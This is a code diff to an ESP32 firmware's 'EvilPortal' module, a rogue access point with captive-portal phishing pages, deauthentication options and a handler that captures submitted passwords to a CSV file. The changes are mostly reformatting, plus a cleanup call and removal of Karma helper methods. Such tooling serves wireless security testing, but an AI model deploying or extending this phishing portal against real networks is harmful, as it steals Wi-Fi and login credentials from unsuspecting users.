@@ -4,23 +4,21 @@
 #include "core/mykeyboard.h"
 #include "core/sd_functions.h"
 #include "core/utils.h"
-#include "core/wifi/webInterface.h"
 #include "core/wifi/wifi_common.h"
+#include "core/wifi/webInterface.h"
 #include "esp_wifi.h"
 #include "wifi_atks.h"
 
 // Constructor with background mode support
-EvilPortal::EvilPortal(
-    String tssid, uint8_t channel, bool deauth, bool verifyPwd, bool autoMode, bool backgroundMode
-)
-    : apName(tssid), _channel(channel), _deauth(deauth), _verifyPwd(verifyPwd), _autoMode(autoMode),
-      _backgroundMode(backgroundMode), webServer(80) {
+EvilPortal::EvilPortal(String tssid, uint8_t channel, bool deauth, bool verifyPwd, bool autoMode, bool backgroundMode)
+    : apName(tssid), _channel(channel), _deauth(deauth), _verifyPwd(verifyPwd), 
+      _autoMode(autoMode), _backgroundMode(backgroundMode), webServer(80) {
     if (!setup()) return;
     // Now stop WebUI cleanly before starting WiFi mode
     cleanlyStopWebUiForWiFiFeature();
     beginAP();
     if (!_backgroundMode) {
-        loop(); // Full UI loop for foreground mode
+        loop();  // Full UI loop for foreground mode
     }
     // In background mode, caller manages heartbeat via processRequests()
 }
@@ -35,6 +33,7 @@ EvilPortal::~EvilPortal() {
     webServer.end();
     dnsServer.stop();
     vTaskDelay(100 / portTICK_PERIOD_MS);
+    wifiDisconnect();
 }
 
 void EvilPortal::CaptiveRequestHandler::handleRequest(AsyncWebServerRequest *request) {
@@ -62,7 +61,7 @@ void EvilPortal::CaptiveRequestHandler::handleRequest(AsyncWebServerRequest *req
 
 bool EvilPortal::setup() {
     if (_autoMode) {
-        if (apName.indexOf("router") != -1 || apName.indexOf("update") != -1 ||
+        if (apName.indexOf("router") != -1 || apName.indexOf("update") != -1 || 
             apName.indexOf("firmware") != -1 || _verifyPwd) {
             loadDefaultHtml_one();
         } else {
@@ -103,7 +102,7 @@ bool EvilPortal::setup() {
     }
 
     options = {
-        {"172.0.0.1",   [this]() { apGateway = IPAddress(172, 0, 0, 1); }  },
+        {"172.0.0.1",   [this]() { apGateway = IPAddress(172, 0, 0, 1); }},
         {"192.168.4.1", [this]() { apGateway = IPAddress(192, 168, 4, 1); }},
     };
 
@@ -146,12 +145,7 @@ void EvilPortal::setupRoutes() {
     });
 
     webServer.on("/hotspot-detect.html", HTTP_GET, [this](AsyncWebServerRequest *request) {
-        request->send(
-            200,
-            "text/html",
-            "<html><head><meta http-equiv=\"refresh\" content=\"0;url=http://" + WiFi.softAPIP().toString() +
-                "\"></head><body></body></html>"
-        );
+        request->send(200, "text/html", "<html><head><meta http-equiv=\"refresh\" content=\"0;url=http://" + WiFi.softAPIP().toString() + "\"></head><body></body></html>");
     });
 
     webServer.on("/library/test/success.html", HTTP_GET, [this](AsyncWebServerRequest *request) {
@@ -225,15 +219,20 @@ void EvilPortal::setupRoutes() {
 
     webServer.onNotFound([this](AsyncWebServerRequest *request) {
         String url = request->url();
-        if (url.indexOf("detectportal") != -1 || url.indexOf("connecttest") != -1 ||
-            url.indexOf("success") != -1 || url.indexOf("generate") != -1 ||
-            url.indexOf("msftconnecttest") != -1 || url.indexOf("clients3.google.com") != -1) {
+        if (url.indexOf("detectportal") != -1 || 
+            url.indexOf("connecttest") != -1 ||
+            url.indexOf("success") != -1 ||
+            url.indexOf("generate") != -1 ||
+            url.indexOf("msftconnecttest") != -1 ||
+            url.indexOf("clients3.google.com") != -1) {
             AsyncWebServerResponse *response = request->beginResponse(302);
             response->addHeader("Location", "http://" + WiFi.softAPIP().toString() + "/");
             request->send(response);
-        } else if (request->args() > 0) {
+        }
+        else if (request->args() > 0) {
             credsController(request);
-        } else {
+        }
+        else {
             portalController(request);
         }
     });
@@ -250,24 +249,26 @@ void EvilPortal::restartWiFi(bool reset) {
         delete _captiveHandler;
         _captiveHandler = nullptr;
     }
-
+    
     webServer.end();
     wifiDisconnect();
     WiFi.softAP(apName);
     webServer.begin();
-
+    
     // Re-add handler
     _captiveHandler = new CaptiveRequestHandler(this);
     webServer.addHandler(_captiveHandler).setFilter(ON_AP_FILTER);
-
+    
     if (reset) resetCapturedCredentials();
 }
 
-void EvilPortal::resetCapturedCredentials(void) { previousTotalCapturedCredentials = -1; }
+void EvilPortal::resetCapturedCredentials(void) {
+    previousTotalCapturedCredentials = -1;
+}
 
 void EvilPortal::loop() {
-    if (_backgroundMode) return; // Background mode uses processRequests instead
-
+    if (_backgroundMode) return;  // Background mode uses processRequests instead
+    
     int lastDeauthTime = millis();
     bool shouldRedraw = true;
 
@@ -313,11 +314,6 @@ void EvilPortal::processRequests() {
         // In background mode, we don't redraw, just let the tracker know
     }
 }
-
-// Karma Integration Methods
-bool EvilPortal::hasCredentials() { return totalCapturedCredentials > 0; }
-
-String EvilPortal::getCapturedPassword() { return lastCred; }
 
 void EvilPortal::drawScreen() {
     drawMainBorderWithTitle("EVIL PORTAL");
@@ -390,8 +386,7 @@ void EvilPortal::printDeauthStatus() {
 void EvilPortal::loadCustomHtml() {
     getFsStorage(fsHtmlFile);
     htmlFileName = loopSD(*fsHtmlFile, true, "HTML", "/");
-    String fileBaseName =
-        htmlFileName.substring(htmlFileName.lastIndexOf("/") + 1, htmlFileName.length() - 5);
+    String fileBaseName = htmlFileName.substring(htmlFileName.lastIndexOf("/") + 1, htmlFileName.length() - 5);
     fileBaseName.toLowerCase();
     outputFile = fileBaseName + "_creds.csv";
     isDefaultHtml = false;
@@ -403,7 +398,9 @@ void EvilPortal::loadCustomHtml() {
         int apStart = firstLine.indexOf("<!-- AP=\"");
         if (apStart != -1) {
             int apEnd = firstLine.indexOf("\" -->", apStart);
-            if (apEnd != -1) { apName = firstLine.substring(apStart + 9, apEnd); }
+            if (apEnd != -1) {
+                apName = firstLine.substring(apStart + 9, apEnd);
+            }
         }
     }
 }
@@ -565,14 +562,19 @@ void EvilPortal::credsController(AsyncWebServerRequest *request) {
         if (key == "password") {
             char blank = '*';
             switch (bruceConfig.evilPortalPasswordMode) {
-                case FULL_PASSWORD: break;
+                case FULL_PASSWORD:
+                    break;
                 case FIRST_LAST_CHAR:
                     if (valueBuffer.length() > 2) {
                         for (int i = 1; i < valueBuffer.length() - 1; i++) { valueBuffer[i] = blank; }
                     }
                     break;
-                case HIDE_PASSWORD: valueBuffer = "*hidden*"; break;
-                case SAVE_LENGTH: valueBuffer = String(valueBuffer.length()) + " chars"; break;
+                case HIDE_PASSWORD:
+                    valueBuffer = "*hidden*";
+                    break;
+                case SAVE_LENGTH:
+                    valueBuffer = String(valueBuffer.length()) + " chars";
+                    break;
             }
         }
 
